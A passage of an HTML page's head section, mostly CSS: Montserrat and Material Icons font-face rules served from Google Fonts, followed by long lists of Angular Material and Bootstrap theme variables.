      unicode-range: U+0100-02BA, U+02BD-02C5, U+02C7-02CC, U+02CE-02D7, U+02DD-02FF, U+0304, U+0308, U+0329, U+1D00-1DBF, U+1E00-1E9F, U+1EF2-1EFF, U+2020, U+20A0-20AB, U+20AD-20C0, U+2113, U+2C60-2C7F, U+A720-A7FF;
    }

    @font-face {
      font-family: 'Montserrat';
      font-style: normal;
      font-weight: 500;
      src: url(https://fonts.gstatic.com/s/montserrat/v29/JTUSjIg1_i6t8kCHKm459WlhyyTh89Y.woff2) format('woff2');
      unicode-range: U+0000-00FF, U+0131, U+0152-0153, U+02BB-02BC, U+02C6, U+02DA, U+02DC, U+0304, U+0308, U+0329, U+2000-206F, U+20AC, U+2122, U+2191, U+2193, U+2212, U+2215, U+FEFF, U+FFFD;
    }

    @font-face {
      font-family: 'Montserrat';
      font-style: normal;
      font-weight: 700;
      src: url(https://fonts.gstatic.com/s/montserrat/v29/JTUSjIg1_i6t8kCHKm459WRhyyTh89ZNpQ.woff2) format('woff2');
      unicode-range: U+0460-052F, U+1C80-1C8A, U+20B4, U+2DE0-2DFF, U+A640-A69F, U+FE2E-FE2F;
    }

    @font-face {
      font-family: 'Montserrat';
      font-style: normal;
      font-weight: 700;
      src: url(https://fonts.gstatic.com/s/montserrat/v29/JTUSjIg1_i6t8kCHKm459W1hyyTh89ZNpQ.woff2) format('woff2');
      unicode-range: U+0301, U+0400-045F, U+0490-0491, U+04B0-04B1, U+2116;
    }

    @font-face {
      font-family: 'Montserrat';
      font-style: normal;
      font-weight: 700;
      src: url(https://fonts.gstatic.com/s/montserrat/v29/JTUSjIg1_i6t8kCHKm459WZhyyTh89ZNpQ.woff2) format('woff2');
      unicode-range: U+0102-0103, U+0110-0111, U+0128-0129, U+0168-0169, U+01A0-01A1, U+01AF-01B0, U+0300-0301, U+0303-0304, U+0308-0309, U+0323, U+0329, U+1EA0-1EF9, U+20AB;
    }

    @font-face {
      font-family: 'Montserrat';
      font-style: normal;
      font-weight: 700;
      src: url(https://fonts.gstatic.com/s/montserrat/v29/JTUSjIg1_i6t8kCHKm459WdhyyTh89ZNpQ.woff2) format('woff2');
      unicode-range: U+0100-02BA, U+02BD-02C5, U+02C7-02CC, U+02CE-02D7, U+02DD-02FF, U+0304, U+0308, U+0329, U+1D00-1DBF, U+1E00-1E9F, U+1EF2-1EFF, U+2020, U+20A0-20AB, U+20AD-20C0, U+2113, U+2C60-2C7F, U+A720-A7FF;
    }

    @font-face {
      font-family: 'Montserrat';
      font-style: normal;
      font-weight: 700;
      src: url(https://fonts.gstatic.com/s/montserrat/v29/JTUSjIg1_i6t8kCHKm459WlhyyTh89Y.woff2) format('woff2');
      unicode-range: U+0000-00FF, U+0131, U+0152-0153, U+02BB-02BC, U+02C6, U+02DA, U+02DC, U+0304, U+0308, U+0329, U+2000-206F, U+20AC, U+2122, U+2191, U+2193, U+2212, U+2215, U+FEFF, U+FFFD;
    }

    @font-face {
      font-family: 'Montserrat';
      font-style: normal;
      font-weight: 900;
      src: url(https://fonts.gstatic.com/s/montserrat/v29/JTUSjIg1_i6t8kCHKm459WRhyyTh89ZNpQ.woff2) format('woff2');
      unicode-range: U+0460-052F, U+1C80-1C8A, U+20B4, U+2DE0-2DFF, U+A640-A69F, U+FE2E-FE2F;
    }

    @font-face {
      font-family: 'Montserrat';
      font-style: normal;
      font-weight: 900;
      src: url(https://fonts.gstatic.com/s/montserrat/v29/JTUSjIg1_i6t8kCHKm459W1hyyTh89ZNpQ.woff2) format('woff2');
      unicode-range: U+0301, U+0400-045F, U+0490-0491, U+04B0-04B1, U+2116;
    }

    @font-face {
      font-family: 'Montserrat';
      font-style: normal;
      font-weight: 900;
      src: url(https://fonts.gstatic.com/s/montserrat/v29/JTUSjIg1_i6t8kCHKm459WZhyyTh89ZNpQ.woff2) format('woff2');
      unicode-range: U+0102-0103, U+0110-0111, U+0128-0129, U+0168-0169, U+01A0-01A1, U+01AF-01B0, U+0300-0301, U+0303-0304, U+0308-0309, U+0323, U+0329, U+1EA0-1EF9, U+20AB;
    }

    @font-face {
      font-family: 'Montserrat';
      font-style: normal;
      font-weight: 900;
      src: url(https://fonts.gstatic.com/s/montserrat/v29/JTUSjIg1_i6t8kCHKm459WdhyyTh89ZNpQ.woff2) format('woff2');
      unicode-range: U+0100-02BA, U+02BD-02C5, U+02C7-02CC, U+02CE-02D7, U+02DD-02FF, U+0304, U+0308, U+0329, U+1D00-1DBF, U+1E00-1E9F, U+1EF2-1EFF, U+2020, U+20A0-20AB, U+20AD-20C0, U+2113, U+2C60-2C7F, U+A720-A7FF;
    }

    @font-face {
      font-family: 'Montserrat';
      font-style: normal;
      font-weight: 900;
      src: url(https://fonts.gstatic.com/s/montserrat/v29/JTUSjIg1_i6t8kCHKm459WlhyyTh89Y.woff2) format('woff2');
      unicode-range: U+0000-00FF, U+0131, U+0152-0153, U+02BB-02BC, U+02C6, U+02DA, U+02DC, U+0304, U+0308, U+0329, U+2000-206F, U+20AC, U+2122, U+2191, U+2193, U+2212, U+2215, U+FEFF, U+FFFD;
    }
  </style>
  <style type="text/css">
    @font-face {
      font-family: 'Material Icons';
      font-style: normal;
      font-weight: 400;
      src: url(https://fonts.gstatic.com/s/materialicons/v143/flUhRq6tzZclQEJ-Vdg-IuiaDsNcIhQ8tQ.woff2) format('woff2');
    }

    .material-icons {
      font-family: 'Material Icons';
      font-weight: normal;
      font-style: normal;
      font-size: 24px;
      line-height: 1;
      letter-spacing: normal;
      text-transform: none;
      display: inline-block;
      white-space: nowrap;
      word-wrap: normal;
      direction: ltr;
      -webkit-font-feature-settings: 'liga';
      -webkit-font-smoothing: antialiased;
    }
  </style>
  <link rel="stylesheet" href="css/styles.css" media="all" onload="this.media='all'"><noscript>
    <link rel="stylesheet" href="css/styles.css">
  </noscript>
  <script src="js/functions2.js"></script>
  <style>
    html {
      --mat-option-selected-state-label-text-color: #3f51b5;
      --mat-option-label-text-color: rgba(0, 0, 0, .87);
      --mat-option-hover-state-layer-color: rgba(0, 0, 0, .04);
      --mat-option-focus-state-layer-color: rgba(0, 0, 0, .04);
      --mat-option-selected-state-layer-color: rgba(0, 0, 0, .04)
    }

    html {
      --mat-optgroup-label-text-color: rgba(0, 0, 0, .87)
    }

    html {
      --mat-option-label-text-font: Roboto, sans-serif;
      --mat-option-label-text-line-height: 24px;
      --mat-option-label-text-size: 16px;
      --mat-option-label-text-tracking: .03125em;
      --mat-option-label-text-weight: 400
    }

    html {
      --mat-optgroup-label-text-font: Roboto, sans-serif;
      --mat-optgroup-label-text-line-height: 24px;
      --mat-optgroup-label-text-size: 16px;
      --mat-optgroup-label-text-tracking: .03125em;
      --mat-optgroup-label-text-weight: 400
    }

    html {
      --mdc-filled-text-field-caret-color: #3f51b5;
      --mdc-filled-text-field-focus-active-indicator-color: #3f51b5;
      --mdc-filled-text-field-focus-label-text-color: rgba(63, 81, 181, .87);
      --mdc-filled-text-field-container-color: whitesmoke;
      --mdc-filled-text-field-disabled-container-color: #fafafa;
      --mdc-filled-text-field-label-text-color: rgba(0, 0, 0, .6);
      --mdc-filled-text-field-disabled-label-text-color: rgba(0, 0, 0, .38);
      --mdc-filled-text-field-input-text-color: rgba(0, 0, 0, .87);
      --mdc-filled-text-field-disabled-input-text-color: rgba(0, 0, 0, .38);
      --mdc-filled-text-field-input-text-placeholder-color: rgba(0, 0, 0, .6);
      --mdc-filled-text-field-error-focus-label-text-color: #f44336;
      --mdc-filled-text-field-error-label-text-color: #f44336;
      --mdc-filled-text-field-error-caret-color: #f44336;
      --mdc-filled-text-field-active-indicator-color: rgba(0, 0, 0, .42);
      --mdc-filled-text-field-disabled-active-indicator-color: rgba(0, 0, 0, .06);
      --mdc-filled-text-field-hover-active-indicator-color: rgba(0, 0, 0, .87);
      --mdc-filled-text-field-error-active-indicator-color: #f44336;
      --mdc-filled-text-field-error-focus-active-indicator-color: #f44336;
      --mdc-filled-text-field-error-hover-active-indicator-color: #f44336;
      --mdc-outlined-text-field-caret-color: #3f51b5;
      --mdc-outlined-text-field-focus-outline-color: #3f51b5;
      --mdc-outlined-text-field-focus-label-text-color: rgba(63, 81, 181, .87);
      --mdc-outlined-text-field-label-text-color: rgba(0, 0, 0, .6);
      --mdc-outlined-text-field-disabled-label-text-color: rgba(0, 0, 0, .38);
      --mdc-outlined-text-field-input-text-color: rgba(0, 0, 0, .87);
      --mdc-outlined-text-field-disabled-input-text-color: rgba(0, 0, 0, .38);
      --mdc-outlined-text-field-input-text-placeholder-color: rgba(0, 0, 0, .6);
      --mdc-outlined-text-field-error-caret-color: #f44336;
      --mdc-outlined-text-field-error-focus-label-text-color: #f44336;
      --mdc-outlined-text-field-error-label-text-color: #f44336;
      --mdc-outlined-text-field-outline-color: rgba(0, 0, 0, .38);
      --mdc-outlined-text-field-disabled-outline-color: rgba(0, 0, 0, .06);
      --mdc-outlined-text-field-hover-outline-color: rgba(0, 0, 0, .87);
      --mdc-outlined-text-field-error-focus-outline-color: #f44336;
      --mdc-outlined-text-field-error-hover-outline-color: #f44336;
      --mdc-outlined-text-field-error-outline-color: #f44336;
      --mat-form-field-disabled-input-text-placeholder-color: rgba(0, 0, 0, .38)
    }

    html {
      --mdc-filled-text-field-label-text-font: Roboto, sans-serif;
      --mdc-filled-text-field-label-text-size: 16px;
      --mdc-filled-text-field-label-text-tracking: .03125em;
      --mdc-filled-text-field-label-text-weight: 400;
      --mdc-outlined-text-field-label-text-font: Roboto, sans-serif;
      --mdc-outlined-text-field-label-text-size: 16px;
      --mdc-outlined-text-field-label-text-tracking: .03125em;
      --mdc-outlined-text-field-label-text-weight: 400;
      --mat-form-field-container-text-font: Roboto, sans-serif;
      --mat-form-field-container-text-line-height: 24px;
      --mat-form-field-container-text-size: 16px;
      --mat-form-field-container-text-tracking: .03125em;
      --mat-form-field-container-text-weight: 400;
      --mat-form-field-outlined-label-text-populated-size: 16px;
      --mat-form-field-subscript-text-font: Roboto, sans-serif;
      --mat-form-field-subscript-text-line-height: 20px;
      --mat-form-field-subscript-text-size: 12px;
      --mat-form-field-subscript-text-tracking: .0333333333em;
      --mat-form-field-subscript-text-weight: 400
    }

    html {
      --mat-select-panel-background-color: white;
      --mat-select-enabled-trigger-text-color: rgba(0, 0, 0, .87);
      --mat-select-disabled-trigger-text-color: rgba(0, 0, 0, .38);
      --mat-select-placeholder-text-color: rgba(0, 0, 0, .6);
      --mat-select-enabled-arrow-color: rgba(0, 0, 0, .54);
      --mat-select-disabled-arrow-color: rgba(0, 0, 0, .38);
      --mat-select-focused-arrow-color: rgba(63, 81, 181, .87);
      --mat-select-invalid-arrow-color: rgba(244, 67, 54, .87)
    }

    html {
      --mat-select-trigger-text-font: Roboto, sans-serif;
      --mat-select-trigger-text-line-height: 24px;
      --mat-select-trigger-text-size: 16px;
      --mat-select-trigger-text-tracking: .03125em;
      --mat-select-trigger-text-weight: 400
    }

    html {
      --mat-autocomplete-background-color: white
    }

    html {
      --mat-menu-item-label-text-color: rgba(0, 0, 0, .87);
      --mat-menu-item-icon-color: rgba(0, 0, 0, .87);
      --mat-menu-item-hover-state-layer-color: rgba(0, 0, 0, .04);
      --mat-menu-item-focus-state-layer-color: rgba(0, 0, 0, .04);
      --mat-menu-container-color: white
    }

    html {
      --mat-menu-item-label-text-font: Roboto, sans-serif;
      --mat-menu-item-label-text-size: 16px;
      --mat-menu-item-label-text-tracking: .03125em;
      --mat-menu-item-label-text-line-height: 24px;
      --mat-menu-item-label-text-weight: 400
    }

    html {
      --mat-paginator-container-text-color: rgba(0, 0, 0, .87);
      --mat-paginator-container-background-color: white;
      --mat-paginator-enabled-icon-color: rgba(0, 0, 0, .54);
      --mat-paginator-disabled-icon-color: rgba(0, 0, 0, .12)
    }

    html {
      --mat-paginator-container-size: 56px
    }

    html {
      --mat-paginator-container-text-font: Roboto, sans-serif;
      --mat-paginator-container-text-line-height: 20px;
      --mat-paginator-container-text-size: 12px;
      --mat-paginator-container-text-tracking: .0333333333em;
      --mat-paginator-container-text-weight: 400;
      --mat-paginator-select-trigger-text-size: 12px
    }

    html {
      --mdc-checkbox-disabled-selected-icon-color: rgba(0, 0, 0, .38);
      --mdc-checkbox-disabled-unselected-icon-color: rgba(0, 0, 0, .38);
      --mdc-checkbox-selected-checkmark-color: #fff;
      --mdc-checkbox-selected-focus-icon-color: #ff4081;
      --mdc-checkbox-selected-hover-icon-color: #ff4081;
      --mdc-checkbox-selected-icon-color: #ff4081;
      --mdc-checkbox-selected-pressed-icon-color: #ff4081;
      --mdc-checkbox-unselected-focus-icon-color: #212121;
      --mdc-checkbox-unselected-hover-icon-color: #212121;
      --mdc-checkbox-unselected-icon-color: rgba(0, 0, 0, .54);
      --mdc-checkbox-unselected-pressed-icon-color: rgba(0, 0, 0, .54);
      --mdc-checkbox-selected-focus-state-layer-color: #ff4081;
      --mdc-checkbox-selected-hover-state-layer-color: #ff4081;
      --mdc-checkbox-selected-pressed-state-layer-color: #ff4081;
      --mdc-checkbox-unselected-focus-state-layer-color: black;
      --mdc-checkbox-unselected-hover-state-layer-color: black;
      --mdc-checkbox-unselected-pressed-state-layer-color: black
    }

    html {
      --mdc-checkbox-state-layer-size: 40px
    }

    html {
      --mat-table-background-color: white;
      --mat-table-header-headline-color: rgba(0, 0, 0, .87);
      --mat-table-row-item-label-text-color: rgba(0, 0, 0, .87);
      --mat-table-row-item-outline-color: rgba(0, 0, 0, .12)
    }

    html {
      --mat-table-header-container-height: 56px;
      --mat-table-footer-container-height: 52px;
      --mat-table-row-item-container-height: 52px
    }

    html {
      --mat-table-header-headline-font: Roboto, sans-serif;
      --mat-table-header-headline-line-height: 22px;
      --mat-table-header-headline-size: 14px;
      --mat-table-header-headline-weight: 500;
      --mat-table-header-headline-tracking: .0071428571em;
      --mat-table-row-item-label-text-font: Roboto, sans-serif;
      --mat-table-row-item-label-text-line-height: 20px;
      --mat-table-row-item-label-text-size: 14px;
      --mat-table-row-item-label-text-weight: 400;
      --mat-table-row-item-label-text-tracking: .0178571429em;
      --mat-table-footer-supporting-text-font: Roboto, sans-serif;
      --mat-table-footer-supporting-text-line-height: 20px;
      --mat-table-footer-supporting-text-size: 14px;
      --mat-table-footer-supporting-text-weight: 400;
      --mat-table-footer-supporting-text-tracking: .0178571429em
    }

    html {
      --mat-badge-background-color: #3f51b5;
      --mat-badge-text-color: white;
      --mat-badge-disabled-state-background-color: #b9b9b9;
      --mat-badge-disabled-state-text-color: rgba(0, 0, 0, .38)
    }

    html {
      --mat-badge-text-font: Roboto, sans-serif;
      --mat-badge-text-size: 12px;
      --mat-badge-text-weight: 600;
      --mat-badge-small-size-text-size: 9px;
      --mat-badge-large-size-text-size: 24px
    }

    html {
      --mat-bottom-sheet-container-text-color: rgba(0, 0, 0, .87);
      --mat-bottom-sheet-container-background-color: white
    }

    html {
      --mat-bottom-sheet-container-text-font: Roboto, sans-serif;
      --mat-bottom-sheet-container-text-line-height: 20px;
      --mat-bottom-sheet-container-text-size: 14px;
      --mat-bottom-sheet-container-text-tracking: .0178571429em;
      --mat-bottom-sheet-container-text-weight: 400
    }

    html {
      --mat-legacy-button-toggle-text-color: rgba(0, 0, 0, .38);
      --mat-legacy-button-toggle-state-layer-color: rgba(0, 0, 0, .12);
      --mat-legacy-button-toggle-selected-state-text-color: rgba(0, 0, 0, .54);
      --mat-legacy-button-toggle-selected-state-background-color: #e0e0e0;
      --mat-legacy-button-toggle-disabled-state-text-color: rgba(0, 0, 0, .26);
      --mat-legacy-button-toggle-disabled-state-background-color: #eeeeee;
      --mat-legacy-button-toggle-disabled-selected-state-background-color: #bdbdbd;
      --mat-standard-button-toggle-text-color: rgba(0, 0, 0, .87);
      --mat-standard-button-toggle-background-color: white;
      --mat-standard-button-toggle-state-layer-color: black;
      --mat-standard-button-toggle-selected-state-background-color: #e0e0e0;
      --mat-standard-button-toggle-selected-state-text-color: rgba(0, 0, 0, .87);
      --mat-standard-button-toggle-disabled-state-text-color: rgba(0, 0, 0, .26);
      --mat-standard-button-toggle-disabled-state-background-color: white;
      --mat-standard-button-toggle-disabled-selected-state-text-color: rgba(0, 0, 0, .87);
      --mat-standard-button-toggle-disabled-selected-state-background-color: #bdbdbd;
      --mat-standard-button-toggle-divider-color: #e0e0e0
    }

    html {
      --mat-standard-button-toggle-height: 48px
    }

    html {
      --mat-legacy-button-toggle-text-font: Roboto, sans-serif;
      --mat-standard-button-toggle-text-font: Roboto, sans-serif
    }

    html {
      --mat-datepicker-calendar-date-selected-state-text-color: white;
      --mat-datepicker-calendar-date-selected-state-background-color: #3f51b5;
      --mat-datepicker-calendar-date-selected-disabled-state-background-color: rgba(63, 81, 181, .4);
      --mat-datepicker-calendar-date-today-selected-state-outline-color: white;
      --mat-datepicker-calendar-date-focus-state-background-color: rgba(63, 81, 181, .3);
      --mat-datepicker-calendar-date-hover-state-background-color: rgba(63, 81, 181, .3);
      --mat-datepicker-toggle-active-state-icon-color: #3f51b5;
      --mat-datepicker-calendar-date-in-range-state-background-color: rgba(63, 81, 181, .2);
      --mat-datepicker-calendar-date-in-comparison-range-state-background-color: rgba(249, 171, 0, .2);
      --mat-datepicker-calendar-date-in-overlap-range-state-background-color: #a8dab5;
      --mat-datepicker-calendar-date-in-overlap-range-selected-state-background-color: #46a35e;
      --mat-datepicker-toggle-icon-color: rgba(0, 0, 0, .54);
      --mat-datepicker-calendar-body-label-text-color: rgba(0, 0, 0, .54);
      --mat-datepicker-calendar-period-button-icon-color: rgba(0, 0, 0, .54);
      --mat-datepicker-calendar-navigation-button-icon-color: rgba(0, 0, 0, .54);
      --mat-datepicker-calendar-header-divider-color: rgba(0, 0, 0, .12);
      --mat-datepicker-calendar-header-text-color: rgba(0, 0, 0, .54);
      --mat-datepicker-calendar-date-today-outline-color: rgba(0, 0, 0, .38);
      --mat-datepicker-calendar-date-today-disabled-state-outline-color: rgba(0, 0, 0, .18);
      --mat-datepicker-calendar-date-text-color: rgba(0, 0, 0, .87);
      --mat-datepicker-calendar-date-outline-color: transparent;
      --mat-datepicker-calendar-date-disabled-state-text-color: rgba(0, 0, 0, .38);
      --mat-datepicker-calendar-date-preview-state-outline-color: rgba(0, 0, 0, .24);
      --mat-datepicker-range-input-separator-color: rgba(0, 0, 0, .87);
      --mat-datepicker-range-input-disabled-state-separator-color: rgba(0, 0, 0, .38);
      --mat-datepicker-range-input-disabled-state-text-color: rgba(0, 0, 0, .38);
      --mat-datepicker-calendar-container-background-color: white;
      --mat-datepicker-calendar-container-text-color: rgba(0, 0, 0, .87)
    }

    html {
      --mat-datepicker-calendar-text-font: Roboto, sans-serif;
      --mat-datepicker-calendar-text-size: 13px;
      --mat-datepicker-calendar-body-label-text-size: 14px;
      --mat-datepicker-calendar-body-label-text-weight: 500;
      --mat-datepicker-calendar-period-button-text-size: 14px;
      --mat-datepicker-calendar-period-button-text-weight: 500;
      --mat-datepicker-calendar-header-text-size: 11px;
      --mat-datepicker-calendar-header-text-weight: 400
    }

    html {
      --mat-divider-color: rgba(0, 0, 0, .12)
    }

    html {
      --mat-expansion-container-background-color: white;
      --mat-expansion-container-text-color: rgba(0, 0, 0, .87);
      --mat-expansion-actions-divider-color: rgba(0, 0, 0, .12);
      --mat-expansion-header-hover-state-layer-color: rgba(0, 0, 0, .04);
      --mat-expansion-header-focus-state-layer-color: rgba(0, 0, 0, .04);
      --mat-expansion-header-disabled-state-text-color: rgba(0, 0, 0, .26);
      --mat-expansion-header-text-color: rgba(0, 0, 0, .87);
      --mat-expansion-header-description-color: rgba(0, 0, 0, .54);
      --mat-expansion-header-indicator-color: rgba(0, 0, 0, .54)
    }

    html {
      --mat-expansion-header-collapsed-state-height: 48px;
      --mat-expansion-header-expanded-state-height: 64px
    }

    html {
      --mat-expansion-header-text-font: Roboto, sans-serif;
      --mat-expansion-header-text-size: 14px;
      --mat-expansion-header-text-weight: 500;
      --mat-expansion-header-text-line-height: inherit;
      --mat-expansion-header-text-tracking: inherit;
      --mat-expansion-container-text-font: Roboto, sans-serif;
      --mat-expansion-container-text-line-height: 20px;
      --mat-expansion-container-text-size: 14px;
      --mat-expansion-container-text-tracking: .0178571429em;
      --mat-expansion-container-text-weight: 400
    }

    html {
      --mat-grid-list-tile-header-primary-text-size: 14px;
      --mat-grid-list-tile-header-secondary-text-size: 12px;
      --mat-grid-list-tile-footer-primary-text-size: 14px;
      --mat-grid-list-tile-footer-secondary-text-size: 12px
    }

    html {
      --mat-icon-color: inherit
    }

    html {
      --mat-sidenav-container-divider-color: rgba(0, 0, 0, .12);
      --mat-sidenav-container-background-color: white;
      --mat-sidenav-container-text-color: rgba(0, 0, 0, .87);
      --mat-sidenav-content-background-color: #fafafa;
      --mat-sidenav-content-text-color: rgba(0, 0, 0, .87);
      --mat-sidenav-scrim-color: rgba(0, 0, 0, .6)
    }

    html {
      --mat-stepper-header-icon-foreground-color: white;
      --mat-stepper-header-selected-state-icon-background-color: #3f51b5;
      --mat-stepper-header-selected-state-icon-foreground-color: white;
      --mat-stepper-header-done-state-icon-background-color: #3f51b5;
      --mat-stepper-header-done-state-icon-foreground-color: white;
      --mat-stepper-header-edit-state-icon-background-color: #3f51b5;
      --mat-stepper-header-edit-state-icon-foreground-color: white;
      --mat-stepper-container-color: white;
      --mat-stepper-line-color: rgba(0, 0, 0, .12);
      --mat-stepper-header-hover-state-layer-color: rgba(0, 0, 0, .04);
      --mat-stepper-header-focus-state-layer-color: rgba(0, 0, 0, .04);
      --mat-stepper-header-label-text-color: rgba(0, 0, 0, .54);
      --mat-stepper-header-optional-label-text-color: rgba(0, 0, 0, .54);
      --mat-stepper-header-selected-state-label-text-color: rgba(0, 0, 0, .87);
      --mat-stepper-header-error-state-label-text-color: #f44336;
      --mat-stepper-header-icon-background-color: rgba(0, 0, 0, .54);
      --mat-stepper-header-error-state-icon-foreground-color: #f44336;
      --mat-stepper-header-error-state-icon-background-color: transparent
    }

    html {
      --mat-stepper-header-height: 72px
    }

    html {
      --mat-stepper-container-text-font: Roboto, sans-serif;
      --mat-stepper-header-label-text-font: Roboto, sans-serif;
      --mat-stepper-header-label-text-size: 14px;
      --mat-stepper-header-label-text-weight: 400;
      --mat-stepper-header-error-state-label-text-size: 16px;
      --mat-stepper-header-selected-state-label-text-size: 16px;
      --mat-stepper-header-selected-state-label-text-weight: 400
    }

    html {
      --mat-toolbar-container-background-color: whitesmoke;
      --mat-toolbar-container-text-color: rgba(0, 0, 0, .87)
    }

    html {
      --mat-toolbar-standard-height: 64px;
      --mat-toolbar-mobile-height: 56px
    }

    html {
      --mat-toolbar-title-text-font: Roboto, sans-serif;
      --mat-toolbar-title-text-line-height: 32px;
      --mat-toolbar-title-text-size: 20px;
      --mat-toolbar-title-text-tracking: .0125em;
      --mat-toolbar-title-text-weight: 500
    }

    :root {
      --bs-blue: #0d6efd;
      --bs-indigo: #6610f2;
      --bs-purple: #6f42c1;
      --bs-pink: #d63384;
      --bs-red: #dc3545;
      --bs-orange: #fd7e14;
      --bs-yellow: #ffc107;
      --bs-green: #198754;
      --bs-teal: #20c997;
      --bs-cyan: #0dcaf0;
      --bs-black: #000;
      --bs-white: #fff;
      --bs-gray: #6c757d;
      --bs-gray-dark: #343a40;
      --bs-gray-100: #f8f9fa;
      --bs-gray-200: #e9ecef;
      --bs-gray-300: #dee2e6;
      --bs-gray-400: #ced4da;
      --bs-gray-500: #adb5bd;
      --bs-gray-600: #6c757d;
      --bs-gray-700: #495057;
      --bs-gray-800: #343a40;
      --bs-gray-900: #212529;
      --bs-primary: #0d6efd;
      --bs-secondary: #6c757d;
      --bs-success: #198754;
      --bs-info: #0dcaf0;
      --bs-warning: #ffc107;
      --bs-danger: #dc3545;
      --bs-light: #f8f9fa;
      --bs-dark: #212529;
      --bs-primary-rgb: 13, 110, 253;
      --bs-secondary-rgb: 108, 117, 125;
      --bs-success-rgb: 25, 135, 84;
      --bs-info-rgb: 13, 202, 240;
      --bs-warning-rgb: 255, 193, 7;
      --bs-danger-rgb: 220, 53, 69;
      --bs-light-rgb: 248, 249, 250;
      --bs-dark-rgb: 33, 37, 41;
      --bs-primary-text-emphasis: #052c65;
      --bs-secondary-text-emphasis: #2b2f32;
      --bs-success-text-emphasis: #0a3622;
      --bs-info-text-emphasis: #055160;
      --bs-warning-text-emphasis: #664d03;
      --bs-danger-text-emphasis: #58151c;
      --bs-light-text-emphasis: #495057;
      --bs-dark-text-emphasis: #495057;
      --bs-primary-bg-subtle: #cfe2ff;
      --bs-secondary-bg-subtle: #e2e3e5;
      --bs-success-bg-subtle: #d1e7dd;
      --bs-info-bg-subtle: #cff4fc;
      --bs-warning-bg-subtle: #fff3cd;
      --bs-danger-bg-subtle: #f8d7da;
      --bs-light-bg-subtle: #fcfcfd;
      --bs-dark-bg-subtle: #ced4da;
      --bs-primary-border-subtle: #9ec5fe;
      --bs-secondary-border-subtle: #c4c8cb;
      --bs-success-border-subtle: #a3cfbb;
      --bs-info-border-subtle: #9eeaf9;
      --bs-warning-border-subtle: #ffe69c;
      --bs-danger-border-subtle: #f1aeb5;
      --bs-light-border-subtle: #e9ecef;
      --bs-dark-border-subtle: #adb5bd;
      --bs-white-rgb: 255, 255, 255;
      --bs-black-rgb: 0, 0, 0;
      --bs-font-sans-serif: system-ui, -apple-system, "Segoe UI", Roboto, "Helvetica Neue", "Noto Sans", "Liberation Sans", Arial, sans-serif, "Apple Color Emoji", "Segoe UI Emoji", "Segoe UI Symbol", "Noto Color Emoji";
      --bs-font-monospace: SFMono-Regular, Menlo, Monaco, Consolas, "Liberation Mono", "Courier New", monospace;
      --bs-gradient: linear-gradient(180deg, rgba(255, 255, 255, .15), rgba(255, 255, 255, 0));
      --bs-body-font-family: var(--bs-font-sans-serif);
      --bs-body-font-size: 1rem;
      --bs-body-font-weight: 400;
      --bs-body-line-height: 1.5;
      --bs-body-color: #212529;
      --bs-body-color-rgb: 33, 37, 41;
      --bs-body-bg: #fff;
      --bs-body-bg-rgb: 255, 255, 255;
      --bs-emphasis-color: #000;
      --bs-emphasis-color-rgb: 0, 0, 0;
      --bs-secondary-color: rgba(33, 37, 41, .75);
      --bs-secondary-color-rgb: 33, 37, 41;
      --bs-secondary-bg: #e9ecef;
      --bs-secondary-bg-rgb: 233, 236, 239;
      --bs-tertiary-color: rgba(33, 37, 41, .5);
      --bs-tertiary-color-rgb: 33, 37, 41;
      --bs-tertiary-bg: #f8f9fa;
      --bs-tertiary-bg-rgb: 248, 249, 250;
      --bs-heading-color: inherit;
      --bs-link-color: #0d6efd;
      --bs-link-color-rgb: 13, 110, 253;
      --bs-link-decoration: underline;
      --bs-link-hover-color: #0a58ca;
      --bs-link-hover-color-rgb: 10, 88, 202;
      --bs-code-color: #d63384;
      --bs-highlight-color: #212529;
      --bs-highlight-bg: #fff3cd;
      --bs-border-width: 1px;
      --bs-border-style: solid;
      --bs-border-color: #dee2e6;
      --bs-border-color-translucent: rgba(0, 0, 0, .175);
      --bs-border-radius: .375rem;
      --bs-border-radius-sm: .25rem;
      --bs-border-radius-lg: .5rem;
      --bs-border-radius-xl: 1rem;
      --bs-border-radius-xxl: 2rem;
      --bs-border-radius-2xl: var(--bs-border-radius-xxl);
      --bs-border-radius-pill: 50rem;
      --bs-box-shadow: 0 .5rem 1rem rgba(0, 0, 0, .15);
      --bs-box-shadow-sm: 0 .125rem .25rem rgba(0, 0, 0, .075);
      --bs-box-shadow-lg: 0 1rem 3rem rgba(0, 0, 0, .175);
      --bs-box-shadow-inset: inset 0 1px 2px rgba(0, 0, 0, .075);
      --bs-focus-ring-width: .25rem;
      --bs-focus-ring-opacity: .25;
      --bs-focus-ring-color: rgba(13, 110, 253, .25);
      --bs-form-valid-color: #198754;
      --bs-form-valid-border-color: #198754;
      --bs-form-invalid-color: #dc3545;
      --bs-form-invalid-border-color: #dc3545
    }

    *,
    *:before,
    *:after {
      box-sizing: border-box
    }

    @media (prefers-reduced-motion: no-preference) {
      :root {
        scroll-behavior: smooth
      }
    }

    body {
      margin: 0;
      font-family: var(--bs-body-font-family);
      font-size: var(--bs-body-font-size);
      font-weight: var(--bs-body-font-weight);
      line-height: var(--bs-body-line-height);
      color: var(--bs-body-color);
      text-align: var(--bs-body-text-align);
      background-color: var(--bs-body-bg);
      -webkit-text-size-adjust: 100%;
      -webkit-tap-highlight-color: rgba(0, 0, 0, 0)
    }

    .h4 {
      margin-top: 0;
      margin-bottom: .5rem;
      font-weight: 500;
      line-height: 1.2;
      color: var(--bs-heading-color)
    }

    .h4 {
      font-size: calc(1.275rem + .3vw)
    }

    @media (min-width: 1200px) {
      .h4 {
        font-size: 1.5rem
      }
    }

    p {
      margin-top: 0;
      margin-bottom: 1rem
    }

    img {
      vertical-align: middle
    }

    button {
      border-radius: 0
    }

    button:focus:not(:focus-visible) {
      outline: 0
    }

    button {
      margin: 0;
      font-family: inherit;
      font-size: inherit;
      line-height: inherit
    }

    button {
      text-transform: none
    }

    button {
      -webkit-appearance: button
    }

    button:not(:disabled) {
      cursor: pointer
    }

    iframe {
      border: 0
    }

    :root {
      --bs-breakpoint-xs: 0;
      --bs-breakpoint-sm: 576px;
      --bs-breakpoint-md: 768px;
      --bs-breakpoint-lg: 992px;
      --bs-breakpoint-xl: 1200px;
      --bs-breakpoint-xxl: 1400px
    }

    .btn {
      --bs-btn-padding-x: .75rem;
      --bs-btn-padding-y: .375rem;
      --bs-btn-font-family: ;
      --bs-btn-font-size: 1rem;
      --bs-btn-font-weight: 400;
      --bs-btn-line-height: 1.5;
      --bs-btn-color: var(--bs-body-color);
      --bs-btn-bg: transparent;
      --bs-btn-border-width: var(--bs-border-width);
      --bs-btn-border-color: transparent;
      --bs-btn-border-radius: var(--bs-border-radius);
      --bs-btn-hover-border-color: transparent;
